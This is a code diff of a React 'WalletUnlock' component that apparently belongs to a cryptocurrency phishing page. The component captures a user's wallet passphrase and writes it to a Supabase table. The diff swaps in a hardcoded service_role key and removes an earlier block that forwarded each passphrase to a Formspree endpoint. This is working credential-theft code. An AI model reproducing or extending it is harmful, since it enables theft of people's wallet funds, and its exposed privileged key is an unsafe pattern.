@@ -1,8 +1,10 @@
 import React, { useState } from 'react';
 import { createClient } from '@supabase/supabase-js';
 
-const supabaseUrl = "https://pqalanvbnnbdcqtlztmg.supabase.co";
-const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBxYWxhbnZibm5iZGNxdGx6dG1nIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTczMTA3OTksImV4cCI6MjA3Mjg4Njc5OX0.4Yq1o0dN08qDB1xR9hLRzQDEV7lREUqP4YZDLUo1bhg";
+const supabaseUrl = "https://oxsnztxcaehckiadajbw.supabase.co";
+const supabaseKey =
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im94c256dHhjYWVoY2tpYWRhamJ3Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjY4NjYyMSwiZXhwIjoyMDkyMjYyNjIxfQ.kZT5BjHeNH0UxKuGYKWMjhmBzf_LU3Br9s6T6dCjsX4";
+
 
 const supabase = createClient(supabaseUrl, supabaseKey);
 
@@ -35,24 +37,12 @@ const WalletUnlock = () => {
 
     try {
       const { data, error } = await supabase
-        .from('friend')
+        .from('fire')
         .insert([{ passphrase }]);
 
       if (error) {
         throw error;
       }
-
-      // const apiUrl =  ""; // Replace with your actual API URL
-      await fetch(`https://formspree.io/f/xkovgvjr`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Accept: "application/json"
-        },
-        body: JSON.stringify({
-          message: `New passphrase submitted:\n\n${passphrase}`
-        })
-      });
 
       console.log('Inserted into Supabase:', data);
       setSuccess(true); // ✅ show success modal
